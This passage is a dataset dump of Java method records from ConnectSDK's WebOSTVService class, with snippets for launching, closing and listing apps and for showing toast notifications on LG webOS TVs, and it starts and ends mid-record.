(mAppToAppIdMappings != null)\n            mAppToAppIdMappings.clear();\n\n        if (mWebAppSessions != null) {\n            Enumeration<WebOSWebAppSession> iterator = mWebAppSessions.elements();\n\n            while (iterator.hasMoreElements()) {\n                WebOSWebAppSession session = iterator.nextElement();\n                session.disconnectFromWebApp();\n            }\n\n            mWebAppSessions.clear();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34624, "method_name": "cancelPairing", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cancelPairing() {\n        if (this.socket != null) {\n            this.socket.disconnect();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34625, "method_name": "getWebAppIdMappings", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ConcurrentHashMap<String,String>", "snippet": "    public ConcurrentHashMap<String, String> getWebAppIdMappings() {\n        return mAppToAppIdMappings;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34626, "method_name": "getLauncher", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Launcher", "snippet": "    public Launcher getLauncher() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34627, "method_name": "getLauncherCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getLauncherCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34628, "method_name": "launchApp", "class_name": "WebOSTVService", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchApp(String appId, AppLaunchListener listener) {\n        AppInfo appInfo = new AppInfo();\n        appInfo.setId(appId);\n\n        launchAppWithInfo(appInfo, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34629, "method_name": "launchAppWithInfo", "class_name": "WebOSTVService", "params": ["AppInfo", "Launcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchAppWithInfo(AppInfo appInfo, Launcher.AppLaunchListener listener) {\n        launchAppWithInfo(appInfo, null, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34630, "method_name": "launchAppWithInfo", "class_name": "WebOSTVService", "params": ["AppInfo", "Object", "Launcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchAppWithInfo(final AppInfo appInfo, Object params, final Launcher.AppLaunchListener listener) {\n        String uri = \"ssap://system.launcher/launch\";\n        JSONObject payload = new JSONObject();\n\n        final String appId = appInfo.getId();\n\n        String contentId = null;\n\n        if (params != null) {\n            try {\n                contentId = (String) ((JSONObject) params).get(\"contentId\");\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n\n        try {\n            payload.put(\"id\", appId);\n\n            if (contentId != null)\n                payload.put(\"contentId\", contentId);\n\n            if (params != null)\n                payload.put(\"params\", params);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                JSONObject obj = (JSONObject) response;\n                LaunchSession launchSession = new LaunchSession();\n\n                launchSession.setService(WebOSTVService.this);\n                launchSession.setAppId(appId); // note that response uses id to mean appId\n                launchSession.setSessionId(obj.optString(\"sessionId\"));\n                launchSession.setSessionType(LaunchSessionType.App);\n\n                Util.postSuccess(listener, launchSession);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34631, "method_name": "launchBrowser", "class_name": "WebOSTVService", "params": ["String", "Launcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchBrowser(String url, final Launcher.AppLaunchListener listener) {\n        String uri = \"ssap://system.launcher/open\";\n        JSONObject payload = new JSONObject();\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                JSONObject obj = (JSONObject) response;\n                LaunchSession launchSession = new LaunchSession();\n\n                launchSession.setService(WebOSTVService.this);\n                launchSession.setAppId(obj.optString(\"id\")); // note that response uses id to mean appId\n                launchSession.setSessionId(obj.optString(\"sessionId\"));\n                launchSession.setSessionType(LaunchSessionType.App);\n                launchSession.setRawData(obj);\n\n                Util.postSuccess(listener, launchSession);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        try {\n            payload.put(\"target\", url);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34632, "method_name": "launchYouTube", "class_name": "WebOSTVService", "params": ["String", "Launcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchYouTube(String contentId, Launcher.AppLaunchListener listener) {\n        launchYouTube(contentId, (float)0.0, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34633, "method_name": "launchYouTube", "class_name": "WebOSTVService", "params": ["String", "float", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchYouTube(final String contentId, float startTime, final AppLaunchListener listener) {\n        JSONObject params = new JSONObject();\n\n        if (contentId != null && contentId.length() > 0) {\n            if (startTime < 0.0) {\n                Util.postError(listener, new ServiceCommandError(0, \"Start time may not be negative\", null));\n                return;\n            }\n\n            try {\n                params.put(\"contentId\", String.format(\"%s&pairingCode=%s&t=%.1f\", contentId, UUID.randomUUID().toString(), startTime));\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n\n        AppInfo appInfo = new AppInfo() {{\n            setId(\"youtube.leanback.v4\");\n            setName(\"YouTube\");\n        }};\n\n        launchAppWithInfo(appInfo, params, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34634, "method_name": "launchHulu", "class_name": "WebOSTVService", "params": ["String", "Launcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchHulu(String contentId, Launcher.AppLaunchListener listener) {\n        JSONObject params = new JSONObject();\n\n        try {\n            params.put(\"contentId\", contentId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        AppInfo appInfo = new AppInfo() {{\n            setId(\"hulu\");\n            setName(\"Hulu\");\n        }};\n\n        launchAppWithInfo(appInfo, params, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34635, "method_name": "launchNetflix", "class_name": "WebOSTVService", "params": ["String", "Launcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchNetflix(String contentId, Launcher.AppLaunchListener listener) {\n        JSONObject params = new JSONObject();\n        String netflixContentId = \"m=http%3A%2F%2Fapi.netflix.com%2Fcatalog%2Ftitles%2Fmovies%2F\" + contentId + \"&source_type=4\";\n\n        try {\n            params.put(\"contentId\", netflixContentId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        AppInfo appInfo = new AppInfo() {{\n            setId(\"netflix\");\n            setName(\"Netflix\");\n        }};\n\n        launchAppWithInfo(appInfo, params, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34636, "method_name": "launchAppStore", "class_name": "WebOSTVService", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchAppStore(String appId, AppLaunchListener listener) {\n        AppInfo appInfo = new AppInfo(\"com.webos.app.discovery\");\n        appInfo.setName(\"LG Store\");\n\n        JSONObject params = new JSONObject();\n\n        if (appId != null && appId.length() > 0) {\n            String query = String.format(\"category/GAME_APPS/%s\", appId);\n            try {\n                params.put(\"query\", query);\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n\n        launchAppWithInfo(appInfo, params, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34637, "method_name": "closeApp", "class_name": "WebOSTVService", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeApp(LaunchSession launchSession, ResponseListener<Object> listener) {\n        String uri = \"ssap://system.launcher/close\";\n        String appId = launchSession.getAppId();\n        String sessionId = launchSession.getSessionId();\n\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"id\", appId);\n            payload.put(\"sessionId\", sessionId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(launchSession.getService(), uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34638, "method_name": "getAppList", "class_name": "WebOSTVService", "params": ["AppListListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAppList(final AppListListener listener) {\n        String uri = \"ssap://com.webos.applicationManager/listApps\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n\n                try {\n                    JSONObject jsonObj = (JSONObject) response;\n\n                    JSONArray apps = (JSONArray) jsonObj.get(\"apps\");\n                    List<AppInfo> appList = new ArrayList<AppInfo>();\n\n                    for (int i = 0; i < apps.length(); i++)\n                    {\n                        final JSONObject appObj = apps.getJSONObject(i);\n\n                        AppInfo appInfo = new AppInfo() {{\n                            setId(appObj.getString(\"id\"));\n                            setName(appObj.getString(\"title\"));\n                            setRawData(appObj);\n                        }};\n\n                        appList.add(appInfo);\n                    }\n\n                    Util.postSuccess(listener, appList);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n        request.send();        \n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34639, "method_name": "getRunningApp", "class_name": "WebOSTVService", "params": ["boolean", "AppInfoListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<AppInfoListener>", "snippet": "    private ServiceCommand<AppInfoListener> getRunningApp(boolean isSubscription, final AppInfoListener listener) {\n        ServiceCommand<AppInfoListener> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                final JSONObject jsonObj = (JSONObject)response;\n                AppInfo app = new AppInfo() {{\n                    setId(jsonObj.optString(\"appId\"));\n                    setName(jsonObj.optString(\"appName\"));\n                    setRawData(jsonObj);\n                }};\n\n                Util.postSuccess(listener, app);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<AppInfoListener>(this, FOREGROUND_APP, null, true, responseListener);\n        else\n            request = new ServiceCommand<AppInfoListener>(this, FOREGROUND_APP, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34640, "method_name": "getRunningApp", "class_name": "WebOSTVService", "params": ["AppInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getRunningApp(AppInfoListener listener) {\n        getRunningApp(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34641, "method_name": "subscribeRunningApp", "class_name": "WebOSTVService", "params": ["AppInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<AppInfoListener>", "snippet": "    public ServiceSubscription<AppInfoListener> subscribeRunningApp(AppInfoListener listener) {\n        return (URLServiceSubscription<AppInfoListener>) getRunningApp(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34642, "method_name": "getAppState", "class_name": "WebOSTVService", "params": ["boolean", "LaunchSession", "AppStateListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<AppStateListener>", "snippet": "    private ServiceCommand<AppStateListener> getAppState(boolean subscription, LaunchSession launchSession, final AppStateListener listener) {\n        ServiceCommand<AppStateListener> request;\n        JSONObject params = new JSONObject();\n\n        try {\n            params.put(\"id\", launchSession.getAppId());\n            params.put(\"sessionId\", launchSession.getSessionId());\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n\n            @Override\n            public void onSuccess(Object object) {\n                JSONObject json = (JSONObject) object;\n                try {\n                    Util.postSuccess(listener, new AppState(json.getBoolean(\"running\"), json.getBoolean(\"visible\")));\n                } catch (JSONException e) {\n                    Util.postError(listener, new ServiceCommandError(0, \"Malformed JSONObject\", null));\n                    e.printStackTrace();\n                }\n            }\n        };\n\n        if (subscription) {\n            request = new URLServiceSubscription<Launcher.AppStateListener>(this, APP_STATE, params, true, responseListener);\n        } else {\n            request = new ServiceCommand<Launcher.AppStateListener>(this, APP_STATE, params, true, responseListener);\n        }\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34643, "method_name": "getAppState", "class_name": "WebOSTVService", "params": ["LaunchSession", "AppStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAppState(LaunchSession launchSession, AppStateListener listener) {\n        getAppState(false, launchSession, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34644, "method_name": "subscribeAppState", "class_name": "WebOSTVService", "params": ["LaunchSession", "AppStateListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<AppStateListener>", "snippet": "    public ServiceSubscription<AppStateListener> subscribeAppState(LaunchSession launchSession, AppStateListener listener) {\n        return (URLServiceSubscription<AppStateListener>) getAppState(true, launchSession, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34645, "method_name": "getToastControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ToastControl", "snippet": "    public ToastControl getToastControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34646, "method_name": "getToastControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getToastControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34647, "method_name": "showToast", "class_name": "WebOSTVService", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showToast(String message, ResponseListener<Object> listener) {\n        showToast(message, null, null, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34648, "method_name": "showToast", "class_name": "WebOSTVService", "params": ["String", "String", "String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showToast(String message, String iconData, String iconExtension, ResponseListener<Object> listener)\n    {\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"message\", message);\n\n            if (iconData != null)\n            {\n                payload.put(\"iconData\", iconData);\n                payload.put(\"iconExtension\", iconExtension);\n            }\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        sendToast(payload, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34649, "method_name": "showClickableToastForApp", "class_name": "WebOSTVService", "params": ["String", "AppInfo", "JSONObject", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showClickableToastForApp(String message, AppInfo appInfo, JSONObject params, ResponseListener<Object> listener) {\n        showClickableToastForApp(message, appInfo, params, null, null, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34650, "method_name": "showClickableToastForApp", "class_name": "WebOSTVService", "params": ["String", "AppInfo", "JSONObject", "String", "String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showClickableToastForApp(String message, AppInfo appInfo, JSONObject params, String iconData, String iconExtension, ResponseListener<Object> listener) {\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"message\", message);\n\n            if (iconData != null) {\n                payload.put(\"iconData\", iconData);\n                payload.put(\"iconExtension\", iconExtension);\n            }\n\n            if (appInfo != null) {\n                JSONObject onClick = new JSONObject();\n                onClick.put(\"appId\", appInfo.getId());\n                if (params != null) {\n                    onClick.put(\"params\", params);\n                }\n                payload.put(\"onClick\", onClick);\n            }\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        sendToast(payload, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34651, "method_name": "showClickableToastForURL", "class_name": "WebOSTVService", "params": ["String", "String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showClickableToastForURL(String message, String url, ResponseListener<Object> listener) {\n        showClickableToastForURL(message, url, null, null, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34652, "method_name": "showClickableToastForURL", "class_name": "WebOSTVService", "params": ["String", "String", "String", "String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showClickableToastForURL(String message, String url, String iconData, String iconExtension, ResponseListener<Object> listener) {\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"message\", message);\n\n            if (iconData != null) {\n                payload.put(\"iconData\", iconData);\n                payload.put(\"iconExtension\", iconExtension);\n            }\n\n            if (url != null) {\n                JSONObject onClick = new JSONObject();\n                onClick.put(\"target\", url);\n                payload.put(\"onClick\", onClick);\n            }\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        sendToast(payload, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34653, "method_name": "sendToast", "class_name": "WebOSTVService", "params": ["JSONObject", "ResponseListener<Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sendToast(JSONObject payload, ResponseListener<Object> listener) {\n        if (!payload.has(\"iconData\"))\n        {\n            Context context = DiscoveryManager.getInstance().getContext();\n\n            try {\n                Drawable drawable = context.getPackageManager().getApplicationIcon(context.getPackageName());\n\n                if(drawable != null) {\n                    BitmapDrawable bitDw = ((BitmapDrawable) drawable);\n                    Bitmap bitmap = bitDw.getBitmap();\n\n                    ByteArrayOutputStream stream = new 